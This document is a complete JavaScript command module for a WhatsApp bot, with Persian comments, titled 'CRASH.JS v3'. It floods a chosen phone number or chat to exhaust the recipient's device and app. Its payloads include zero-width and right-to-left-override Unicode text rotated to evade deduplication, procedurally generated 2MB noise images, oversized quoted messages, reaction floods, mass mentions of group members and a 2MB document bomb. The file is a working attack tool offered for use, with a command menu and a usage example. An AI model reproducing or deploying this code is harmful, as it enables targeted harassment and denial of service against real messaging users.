// =======================
// CRASH.JS v3 — کیت فشار سنگین واتساپ (Resource Exhaustion)
//
// حالت‌ها:
//   !crash                     → حمله ترکیبی (combo) به چت فعلی
//   !crash <شماره>             → حمله ترکیبی به شماره
//   !crash flood <n> [شماره]   → فلاد متنی با پیلودهای متنوع
//   !crash media <n> [شماره]   → فلاد تصویری (تصاویر نویز PNG)
//   !crash quote <n> [شماره]   → فلاد نقل‌قول غول‌پیکر
//   !crash react <n> [شماره]   → فلاد ریکشن
//   !crash mention <n>         → منشن همه اعضا (فقط گروه)
//   !crash doc [شماره]         → سند ۲MB
//   !crash combo <n> [شماره]   → ترکیب همه (پیش‌فرض)
//   !crash list
// =======================

import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// =======================
// ابزار شماره
// =======================
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return {
    target: toJid(args[idx]),
    rest: [...args.slice(0, idx), ...args.slice(idx + 1)],
  };
}

// =======================
// پیلودهای متنی متنوع (برای دور زدن dedup واتساپ)
// =======================
const textPayloads = [
  () => "\u200B".repeat(3500) + "⚫",
  () => "⚫\u200B".repeat(1000),
  () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
  () => "👨\u200D👩\u200D👧\u200D👦".repeat(300),
  () => "ༀ".repeat(1500),
  () => "❤\uFE0F".repeat(2500),
  () => "\u202E" + "!ینامزاس یسررب یارب".repeat(120),
  () => "ا".repeat(400) + "\u0651\u064E\u0650".repeat(900) + "ب".repeat(400),
  () => ("x\u200B\u202E\u0301\uFE0F").repeat(1200),
  () => "A".repeat(5000) + "\u200B".repeat(2000) + "B".repeat(5000),
];

// =======================
// ساخت PNG نویز با Node خالص (zlib داخلی)
// =======================
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

function makeNoisePng(w, h, seed) {
  const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0);
  ihdr.writeUInt32BE(h, 4);
  ihdr[8] = 8;  // bit depth
  ihdr[9] = 2;  // color type: RGB

  // نویز شبه‌تصادفی (هر تصویر متفاوت → هیچ dedup نشود)
  let s = seed >>> 0;
  const rnd = () => (s = (s * 1664525 + 1013904223) >>> 0);

  const row = Buffer.alloc(1 + w * 3);
  const rows = [];
  for (let y = 0; y < h; y++) {
    row[0] = 0; // filter none
    for (let x = 0; x < w; x++) {
      row[1 + x * 3] = rnd() & 0xFF;
      row[2 + x * 3] = rnd() & 0xFF;
      row[3 + x * 3] = rnd() & 0xFF;
    }
    rows.push(Buffer.from(row));
  }
  const idat = zlib.deflateSync(Buffer.concat(rows), { level: 9 });

  const chunk = (type, data) => {
    const t = Buffer.from(type);
    const out = Buffer.alloc(8 + data.length);
    out.writeUInt32BE(data.length, 0);
    t.copy(out, 4);
    data.copy(out, 8);
    out.writeUInt32BE(crc32(Buffer.concat([t, data])), 8 + data.length);
    return out;
  };

  return Buffer.concat([sig, chunk("IHDR", ihdr), chunk("IDAT", idat), chunk("IEND", Buffer.alloc(0))]);
}

// =======================
// ارسال امن (با گزارش خطا)
// =======================
async function sendTo(sock, target, content, from) {
  const to = target || from;
  try {
    return await sock.sendMessage(to, content);
  } catch (e) {
    console.log("CRASH SEND ERROR:", to, e.message);
    return null;
  }
}

// =======================
// حالت‌های حمله
// =======================

// ۱) فلاد متنی — پیلودها را می‌چرخاند تا پیام تکراری نشود
async function flood(sock, target, count, from) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    const text = textPayloads[i % textPayloads.length]();
    if (await sendTo(sock, target, { text }, from)) ok++;
    await sleep(150);
  }
  return ok;
}

// ۲) فلاد تصویری — هر بار PNG نویز جدید (حدود ۲MB هر کدام)
async function mediaFlood(sock, target, count, from) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    const img = makeNoisePng(800, 800, Date.now() + i * 99991);
    if (await sendTo(sock, target, {
      image: img,
      caption: `bomb ${i}`,
      mimetype: "image/png",
    }, from)) ok++;
    await sleep(300);
  }
  return ok;
}

// ۳) فلاد نقل‌قول غول‌پیکر — رندر نقل‌قول سنگین است
async function quoteFlood(sock, target, count, from) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    const ok2 = await sendTo(sock, target, {
      text: "متن " + i,
      contextInfo: {
        quotedMessage: {
          extendedTextMessage: {
            text: "\u200B".repeat(3000) + "⚫".repeat(300) + "\u200B".repeat(3000),
          },
        },
      },
    }, from);
    if (ok2) ok++;
    await sleep(300);
  }
  return ok;
}

// ۴) فلاد ریکشن — روی پیام‌های خودمان ریکشن بگذار
async function reactFlood(sock, target, count, from) {
  const emojis = ["😈", "💥", "🔥", "💀", "🖕", "😵", "🤯", "👹"];
  let ok = 0;
  for (let i = 0; i < count; i++) {
    const sent = await sendTo(sock, target, { text: "⚫" + i }, from);
    if (!sent) continue;
    try {
      await sock.sendMessage(target || from, {
        react: { text: emojis[i % emojis.length], key: sent.key },
      });
      ok++;
    } catch (e) { console.log("REACT ERR:", e.message); }
    await sleep(200);
  }
  return ok;
}

// ۵) منشن همه اعضا — فقط گروه
async function mentionFlood(sock, count, from) {
  if (!from.includes("@g.us")) return -1;
  let meta;
  try { meta = await sock.groupMetadata(from); } catch (e) { return -2; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    try {
      await sock.sendMessage(from, {
        text: "@all " + "!".repeat(i + 1),
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("MENTION ERR:", e.message); }
    await sleep(250);
  }
  return ok;
}

// ۶) سند ۲MB
async function docBomb(sock, target, from) {
  const buf = Buffer.alloc(2 * 1024 * 1024, 0x41); // 'A'
  return sendTo(sock, target, {
    document: buf,
    mimetype: "text/plain",
    fileName: "list.txt",
  }, from);
}

// ۷) ترکیبی — همه حالت‌ها در یک چرخه
async function combo(sock, target, rounds, from) {
  let t = 0, m = 0, q = 0, r = 0;
  for (let i = 0; i < rounds; i++) {
    switch (i % 4) {
      case 0:
        t += await flood(sock, target, 5, from);          break;
      case 1:
        m += await mediaFlood(sock, target, 2, from);     break;
      case 2:
        q += await quoteFlood(sock, target, 3, from);     break;
      case 3:
        r += await reactFlood(sock, target, 2, from);     break;
    }
    await sleep(500);
  }
  return { t, m, q, r };
}

// =======================
// هندلر اصلی
// =======================
export default async function crash(sock, from, body, m, args) {
  const { target, rest } = extractTarget(args);
  const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";

  if (rest.length === 0) {
    const res = await combo(sock, target, 5, from);
    await sock.sendMessage(from, {
      text: `💥 COMBO تمام شد → ${who}\n` +
            `   متن: ${res.t} | تصویر: ${res.m} | نقل‌قول: ${res.q} | ریکشن: ${res.r}`,
    });
    return;
  }

  const first = rest[0].toLowerCase();
  const getN = (def) => {
    const num = rest.slice(1).find((a) => /^\d{1,3}$/.test(a));
    return Math.min(parseInt(num) || def, 300);
  };

  if (first === "list") {
    await sock.sendMessage(from, {
      text: "🧨 CRASH v3 — حالت‌ها:\n" +
            "flood | media | quote | react | mention | doc | combo\n\n" +
            "مثال: !crash combo 93794394088",
    });
    return;
  }

  let res, msg;
  switch (first) {
    case "flood":
      res = await flood(sock, target, getN(50), from);
      msg = `🔥 فلاد متن: ${res} پیام → ${who}`;
      break;
    case "media":
      res = await mediaFlood(sock, target, Math.min(getN(15), 30), from);
      msg = `🖼 فلاد تصویر: ${res} عکس → ${who}`;
      break;
    case "quote":
      res = await quoteFlood(sock, target, getN(20), from);
      msg = `💬 فلاد نقل‌قول: ${res} پیام → ${who}`;
      break;
    case "react":
      res = await reactFlood(sock, target, getN(20), from);
      msg = `😈 فلاد ریکشن: ${res} ریکشن → ${who}`;
      break;
    case "mention":
      res = await mentionFlood(sock, getN(10), from);
      msg = res === -1 ? "❌ این حالت فقط در گروه کار می‌کند" :
            res === -2 ? "❌ دسترسی به متادیتای گروه نشد" :
            `📣 منشن: ${res} پیام به همه اعضا`;
      break;
    case "doc":
      res = await docBomb(sock, target, from);
      msg = res ? `📄 سند ۲MB → ${who}` : `❌ ارسال به ${who} ناموفق بود`;
      break;
    case "combo":
      res = await combo(sock, target, getN(5), from);
      msg = `💥 COMBO → ${who}\n` +
            `   متن: ${res.t} | تصویر: ${res.m} | نقل‌قول: ${res.q} | ریکشن: ${res.r}`;
      break;
    default:
      msg = "❌ حالت ناشناخته. !crash list";
  }

  await sock.sendMessage(from, { text: msg });
}